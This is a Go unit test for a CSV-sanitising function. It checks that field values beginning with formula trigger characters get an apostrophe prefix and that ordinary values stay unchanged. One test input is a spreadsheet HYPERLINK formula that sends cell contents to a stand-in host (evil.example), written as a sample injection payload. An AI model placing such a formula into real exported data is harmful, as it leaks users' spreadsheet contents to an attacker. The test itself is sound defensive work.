package csvsafe

import "testing"

func TestField_TriggerCharacters_Neutralized(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"formula HYPERLINK", `=HYPERLINK("https://evil.example/?d="&A2&B2,"klik")`, `'=HYPERLINK("https://evil.example/?d="&A2&B2,"klik")`},
		{"plus prefix", "+1+1", "'+1+1"},
		{"minus prefix", "-1+1", "'-1+1"},
		{"at prefix (DDE)", "@SUM(1+1)", "'@SUM(1+1)"},
		{"tab prefix", "\tsomething", "'\tsomething"},
		{"carriage return prefix", "\rsomething", "'\rsomething"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Field(tc.in)
			if got != tc.want {
				t.Fatalf("Field(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestField_OrdinaryValues_Unchanged(t *testing.T) {
	cases := []string{
		"Budi Santoso",
		"budi@example.com",
		"6281234567890",
		"",
		"PT Maju Jaya",
		"O'Brien", // apostrophe NOT at position 0 must not be touched
	}
	for _, in := range cases {
		if got := Field(in); got != in {
			t.Fatalf("Field(%q) = %q, want unchanged %q", in, got, in)
		}
	}
}
